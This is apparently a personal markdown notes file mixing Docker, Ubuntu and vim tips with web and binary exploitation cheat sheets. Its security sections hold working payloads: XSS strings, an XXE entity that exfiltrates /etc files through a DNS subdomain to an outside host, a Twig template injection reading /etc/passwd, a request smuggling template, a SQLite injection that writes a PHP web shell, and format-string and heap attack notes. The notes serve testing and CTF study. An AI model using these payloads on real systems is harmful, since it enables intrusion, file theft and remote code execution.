
# _Research notes...._   
for my private purposes :)

### Contents
- [Burp Suite Professional](#burp-suite-professional)
- [Docker](#docker)
- [Ubuntu](#ubuntu)
- [Web Applications Security](#web-applications-security)
   + [XSS](#xss) 
   + [XXE](#xxe)
   + [LFI](#lfi)
   + [ESI](#esi)
   + [SSTI](#ssti)
   + [Request Smuggling](#request-smuggling)
   + [Hackvertor](#hackvertor)
   + [SQL Injection](#sql-injection)
   + [PHP](#php)
   + [ASP.NET](#aspnet)
- [Network](#network)
- [/dev/null](#devnull)  
- [low-level](#low-level)  
- [IDA PRO](#ida-pro)  
- [Heap Exploitation](#heap-exploitation)  

## Burp Suite Professional
### Running own collaborator:  
`java -Xms10m -Xmx200m -XX:GCTimeRatio=19 -jar burp.jar --collaborator-server`

Non-standard ports:  
Configuration file: `--collaborator-config=myconfig.config`
 - https://portswigger.net/burp/documentation/collaborator/deploying#running-on-non-standard-ports
 - https://portswigger.net/burp/documentation/collaborator/deploying#collaborator-configuration-file-format

## Docker
### Run from _Dockerfile_ in directory:  
```docker build -t name .```  
### Remove all stopped containers  
```docker container prune```
### Remove dangling images
```docker image prune```  
### Stop and remove all containers
```
$ docker container stop $(docker container ls -aq)
$ docker container rm $(docker container ls -aq)
```

## Ubuntu
### Setup polish locales
Show locales:  
`locale -a`

Show default locales:  
`cat /etc/default/locale `

Install polish locale:  
`sudo locale-gen pl_PL.utf8`

Setup locales:  
`update-locale LANG=pl_PL.utf8`

### Add wireguard to systemd:  
```sh
# Add:  
sudo systemctl enable wg-quick@wg0.service
sudo systemctl daemon-reload
# Run:  
sudo systemctl start wg-quick@wg0
# Check status:
systemctl status wg-quick@wg0
```  

## Web Applications Security
### XSS
Some helpful payloads caught in the wild
```html
<svG x=1 onload=(co\u006efirm)``//
<embed src=//14.rs>
<marquee loop=1 width=0 onfinish=confirm(1)>
<marquee/onstart=alert(1)>
<esi:include src="http://abcdef.burpcollaborator.net/" /><script>alert(1)</script>
<svg><a><rect width=100% height=100% /><animate attributeName=href to=javascript:alert(document.location)>
<svg><a><animate attributeName=href to=javascript:alert(document.location) /><text y=15>Click me!</text></a>
```

### XXE  
#### Exfiltrate in subdomain name:  
dtd file without .dtd extension _(test.html)_:  
```xml
<!ENTITY % file SYSTEM "file:///etc/flag">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://%file;.b0f4f2d1d89d4ec413ad.d.zhack.ca'>">
%eval;
%exfiltrate;
```  
Injection:
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///tmp/test.html"> %xxe;]>
```  
http://dnsbin.zhack.ca/  
### LFI
SVG LFI (ImageMagick):  
https://blog.bushwhackers.ru/googlectf-2019-gphotos-writeup/  
```
<?xml version="1.0" encoding="UTF-8"?>
<svg width="1200px" height="1200px">
  <image width="1200" height="1200" href="text:/etc/hosts" />
</svg>
```
### ESI 
*Edge Side Include Injection*    
WAF'alike bypass:
```html
<svg<!--esi--> onload=aler<!--esi-->t<!--esi-->``
```
```html
he<!--esi-->llo -> hello 
but
he<!--esx-->llo isn't modified 
you have ESI injection
```
```xml
<esi:include src="/anypage.html" dca="none" />
```
XSS  
```
<esi:include src="http://abcdef.burpcollaborator.net/" /><script>alert(1)</script>
```
 - https://twitter.com/alxbrsn/status/981256374230319112
 - https://t.co/XRxIalWcng?amp=1 
 - https://t.co/vzRIo3RuaR?amp=1
 - https://www.slideshare.net/cisoplatform7/edge-side-include-injection-abusing-caching-servers-into-ssrf-and-transparent-session-hijacking  
 
 ### SSTI  
 Twig3 RCE:  
```
{{['cat${IFS}/etc/passwd']|filter('system')}}
```
 
 ### Request Smuggling  
 TE.CL + Hackvertor  
 *(disable “Update Content-Length” in Repeater && “Auto Update Content Length” in Hackvertor Settings)*  
 ```
 POST / HTTP/1.1
Host: abc.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 3

<@chunked_dec2hex_4><@get_var_3 /><@/chunked_dec2hex_4>
<@set_var_1><@length_2>GPOST / HTTP/1.1
Host: abc.com
Content-Length: 15

x=1<@/length_2><@/set_var_1>
0
```
 ### Hackvertor  
 JSON escape:
```xml
 <@python_4("import json;output = json.dumps(input)","7d808063a7c69f9dad4f4a3cb1c2bd1a")>test123'<>"<@/python_4>
 Result: "test123'<>\""
```
### SQL Injection
#### SQLite  
Connect:  
`$ sqlite3 test.db`  

Command execution:  
```sql
ATTACH DATABASE '/var/www/html/y.php' AS y;--
CREATE TABLE y.p (dataz text);--
INSERT INTO y.p (dataz) VALUES ('<? system($_GET[''cmd'']);?>');--
```  
#### Alternatives to information_schema table (MySQL)
```sql
SELECT * FROM sys.x$schema_flattened_keys;
```
Blind SQL Injection without _in_:  
https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952  
### PHP
### finfo with specific comment
```php
// After Upload:
echo (new finfo)->file($_FILES["fileToUpload"]["tmp_name"]);
//Rendered:
JPEG image data, JFIF standard 1.02, aspect ratio, density 1x1, segment length 16, comment: "AAAAAAAAAAAAAAAAAA"
/*
Uploaded file:
$ cat test1234.txt | base64
/9j/4AAQSkZJRgABAgAAAQABAAD//kFBQUFBQUFBQUFBQUFBQUFBQUFB
*/
```
### ASP.NET
 - RCE Telerik https://know.bishopfox.com/research/cve-2019-18935-remote-code-execution-in-telerik-ui?utm_campaign=190101_Posts_Blog&utm_source=Caleb%20-%20Github
 - https://github.com/noperator/CVE-2019-18935
 - https://github.com/Illuminopi/RCEvil.NET/    

## Network  
### Lookup and display the route for a destination  
```
route get 192.168.13.14
```

## /dev/null
### nc permanent 'web-server'
```sh
while true; do 
  echo -e "HTTP/1.1 200 OK\n\n $(date)" | nc -l -p 1500 -q 1
done
```

### vim - nice colors for dark background
```
:set background=dark
```
permanently:
```
echo 'set background=dark' >> $HOME/.vimrc
```

### vim - show line numbers
```
:set number
```  

### vim - use a mouse  
```
:set mouse=a
```  

### vmnet restart
```
/Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli --stop
/Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli --config
/Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli --start
Check your current status:
/Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli --status
```  
  
## low-level
### GLIBC version
```sh
ldd --version
```

### Negative integer (_i.e. from printf(%d)/unsigned int_) to hex in python
```py
>>> hex(-199703103 & (2**32-1)) # 32-bit
'0xf418c5c1L'
>>> hex(-199703103 & (2**64-1)) # 64-bit
'0xfffffffff418c5c1L'
```

### Shared library actually linked
```sh
$ ldd -r -v aerofloat
	linux-vdso.so.1 (0x00007ffce8bf5000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcbeeced000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fcbef0de000)

	Version information:
	./aerofloat:
		libc.so.6 (GLIBC_2.7) => /lib/x86_64-linux-gnu/libc.so.6
		libc.so.6 (GLIBC_2.2.5) => /lib/x86_64-linux-gnu/libc.so.6
	/lib/x86_64-linux-gnu/libc.so.6:
		ld-linux-x86-64.so.2 (GLIBC_2.3) => /lib64/ld-linux-x86-64.so.2
		ld-linux-x86-64.so.2 (GLIBC_PRIVATE) => /lib64/ld-linux-x86-64.so.2
```

### pwntools environment variables (LD_PRELOAD)
```py
p = process('./aerofloat', env = {'LD_PRELOAD' : './libc.so.6 ./ld-linux-x86-64.so.2'})
```

### libc leak via puts (ropchain)
```
puts@plt(puts@got)
puts@plt:
   0x0000000000401030 <+0>:	jmp    QWORD PTR [rip+0x2fe2]        # 0x404018
   
0x040430(*0x04018),
0x04018 = 0x7f......
```
### invalid start byte .decode() python
```py
>>> struct.pack("<L", 0x401192).decode()
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  
e.g.: (https://docs.python.org/3/howto/unicode.html)
UnicodeDecodeError: 'utf-8' codec can't decode byte 0x92 in position 0: invalid start byte
>>> struct.pack("<L", 0x401192).decode("utf-8", "backslashreplace")
'\\x92\x11@\x00'
```

### gdb SIGHUP disable
```
handle SIGHUP noprint nostop pass
```

### gdb follow-fork
set follow-fork-mode command controls the behavior of GDB when the debugged program calls fork() or vfork()  
```
set follow-fork-mode parent
set follow-fork-mode child
show follow-fork-mode
```

### Display arguments passed to a function when stopped at a call instruction
```
pwndbg> dumpargs
        format:    0xffffdb2c ◂— 'test\n'
        vararg:    0x20
```

### Extended information for virtual address (gdb)
```
pwndbg> xinfo 0x80490a0
Extended information for virtual address 0x80490a0:

  Containing mapping:
 0x8049000  0x804a000 r-xp     1000 1000   /mnt/hgfs/LEARN/xx/binary/binary

  Offset information:
         Mapped Area 0x80490a0 = 0x8049000 + 0xa0
         File (Base) 0x80490a0 = 0x8048000 + 0x10a0
      File (Segment) 0x80490a0 = 0x8049000 + 0xa0
         File (Disk) 0x80490a0 = /mnt/hgfs/LEARN/xx/binary/binary + 0x10a0

 Containing ELF sections:
            .plt.got 0x80490a0 = 0x80490a0 + 0x0
```
### pwndbg search pointer
```
pwndbg> search -t pointer 0x804b398
binary          0x8048394 0x804b398
binary          0x80490a2 cwde
[heap]          0x8e76570 0x804b398
[heap]          0x8e76574 0x804b398
[stack]         0xffa8007c 0x804b398
[stack]         0xffa80080 0x804b398
```
### Format String (pwntools)
```
>>> from pwn import *
>>> fmtstr_payload(71, {0x804b398: 0x38}, write_size='byte')
b'%56c%74$naaa\x98\xb3\x04\x08'
```
_To prevent 00 00 in case write_size as above:_
```py
b'%56c%74$hhna\x98\xb3\x04\x08'
```

## IDA PRO
- https://www.hex-rays.com/products/ida/support/freefiles/IDA_Pro_Shortcuts.pdf (IDA PRO shortcuts)  
- https://www.unknowncheats.me/wiki/How_to_use_IDA_Pro_efficiently (How to use IDA PRO efficiently)  
- https://malwareunicorn.org/workshops/idacheatsheet.html (IDA PRO cheatsheet)  

## Heap Exploitation
- _After tcache is filled, the free memory is placed in fastbin or unsorted bin as before._ (https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/tcache/)  
_tcache bins can only hold 7 entries at a time._ (https://drive.google.com/file/d/1XpdruvtC1qW0OKLxO8FaqU9XCl8O_SON/view)

### Hijack hook functions  
```
The GNU C Library lets you modify the behavior of malloc, 
realloc, and free by specifying appropriate hook functions. 
You can use these hooks to help you debug programs that use 
dynamic memory allocation, for example.
```
Hook variables declared in malloc.h and their default values are 0x0 - __malloc_hook, __free_hook.  
```
gef➤  p __free_hook
$2 = (void (*)(void *, const void *)) 0x0
```

- unsorted bins -> 2 pointers (e.g. libc leak)
- House of Spirit - create bin where we want (https://drive.google.com/open?id=1VpX7KuvKquq4hOAd4U-xsaS_bMyloIz5)  
_In the TCache House of Spirit, an attacker passes a pointer to a fake chunk header to the free API. This chunk can be of almost arbitrary size. The allocator will subsequently insert this fake chunk into a tcache freelist. The next malloc of the appropriate size will return the fake chunk which may overlap data that may be of benefit to the attacker._
- Tcache poisoning (https://drive.google.com/file/d/1XpdruvtC1qW0OKLxO8FaqU9XCl8O_SON/view?usp=sharing)  
_e attack is performed via corrupting, or poisoning the tcache such that malloc returns an arbitrary pointer. This may allow for control flow hijacking if malloc returns a pointer to a function pointer and an attacker is able to write to that malloc returned buffer. TCache poisoning is possible from heap corruption including buffer overflows and Use-After-Frees._
